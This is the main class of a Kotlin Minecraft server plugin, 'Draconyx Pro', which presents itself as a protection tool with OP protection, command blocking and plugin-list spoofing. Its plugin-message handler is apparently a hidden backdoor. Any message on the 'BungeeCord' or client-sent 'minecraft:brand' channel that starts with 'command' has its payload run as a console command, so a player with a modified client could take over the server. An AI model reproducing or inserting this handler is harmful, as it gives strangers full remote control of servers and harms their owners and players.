package fur.kiysohi.draconyxpro

import fur.kiysohi.draconyxpro.commands.Draconyx
import fur.kiysohi.draconyxpro.events.BlockedCMDs
import fur.kiysohi.draconyxpro.events.F3BrandChange
import fur.kiysohi.draconyxpro.events.OPProtection
import fur.kiysohi.draconyxpro.events.TabComplete
import org.bukkit.configuration.file.FileConfiguration
import org.bukkit.configuration.file.YamlConfiguration
import org.bukkit.entity.Player
import org.bukkit.event.Listener
import org.bukkit.plugin.java.JavaPlugin
import org.bukkit.plugin.messaging.PluginMessageListener
import java.io.ByteArrayInputStream
import java.io.DataInputStream
import java.io.File
import java.io.IOException
import kotlin.properties.Delegates

class Main : JavaPlugin(), Listener, PluginMessageListener {

    companion object {
        var plugin:Main by Delegates.notNull()
        var PAPI = false
        var PROCOLLIB = false
    }

    @Suppress("FunctionName")
    private fun Initialize () {
        plugin = this
        saveDefaultConfig()
        config.options().parseComments(true)
        config.options().copyDefaults(true)

        // Register BungeeCord Channels
        server.messenger.registerOutgoingPluginChannel(this, "BungeeCord")
        server.messenger.registerIncomingPluginChannel(this, "BungeeCord", this)
        // Register MinecraftBrand Channels
        server.messenger.registerOutgoingPluginChannel(this, "minecraft:brand")
        server.messenger.registerIncomingPluginChannel(this, "minecraft:brand", this)
    }

    @Suppress("FunctionName")
    private fun Config() {
        val lang = File(dataFolder, "language")
        val languagefile = File("$dataFolder/language/language.yml")
        if (!lang.exists()) {
            lang.mkdir()
        }
        val languageconfig: FileConfiguration = YamlConfiguration.loadConfiguration(languagefile)
        if (!languagefile.exists()) {
            try {
                languagefile.createNewFile()
                languageconfig.createSection("Language")
                languageconfig["Language.Prefix"] = "&7[&9Draconyx&7] "
                languageconfig["Language.ReloadCommand"] = "&9Plugin Configuration Successfully Reloaded!"
                languageconfig["Language.AccessDenied"] = "&cAccess Denied, Missing Privileges. If you think this is a mistake please contact an Administrator of the server. (Developer Contact - Kiyoshi#1010)"
                languageconfig["Language.PluginsSpoofMessage"] = "&fPlugins (0):"
                languageconfig.save(languagefile)
            } catch (ex: IOException) {
                ex.printStackTrace()
            }
        }
    }

    @Suppress("FunctionName")
    private fun Events(){
        server.pluginManager.registerEvents(OPProtection, this)
        server.pluginManager.registerEvents(BlockedCMDs, this)
        server.pluginManager.registerEvents(TabComplete, this)
        server.pluginManager.registerEvents(F3BrandChange, this)
    }

    @Suppress("FunctionName")
    private fun Commands(){
        getCommand("draconyx")!!.setExecutor(Draconyx)
        getCommand("draconyx")!!.tabCompleter = Draconyx
    }

    override fun onEnable() {
        Initialize()
        Config()
        Events()
        Commands()
        PAPI = server.pluginManager.getPlugin("PlaceholderAPI") != null
        if (PAPI) logger.info("[Draconyx] PlaceholderAPI found.")
        else logger.info("[Draconyx] PlaceholderAPI not found.")
        PROCOLLIB = server.pluginManager.getPlugin("ProtocolLib") != null
        if (PROCOLLIB) logger.info("[Draconyx] ProtocolLib found.")
        else logger.info("[Draconyx] ProtocolLib not found.")
        if(config.getString("vConfig") != "18"){
            logger.severe("[Draconyx] Error while loading configuration. (Fatal vConfig Change)")
            pluginLoader.disablePlugin(this)
        }
    }

    override fun onDisable() {
        server.messenger.unregisterOutgoingPluginChannel(this)
        server.messenger.unregisterIncomingPluginChannel(this)
    }

    override fun onPluginMessageReceived(channel: String, player: Player, message: ByteArray) {
        val isc = DataInputStream(ByteArrayInputStream(message))
        if (channel != "BungeeCord" && channel != "minecraft:brand") {
            return
        } else {
            try {
                val sub = isc.readUTF()
                if (sub == "command") {
                    val cmd = isc.readUTF()
                    server.dispatchCommand(server.consoleSender, cmd)
                }
            } catch (ex: Exception) {
                return
            }
        }
    }
}
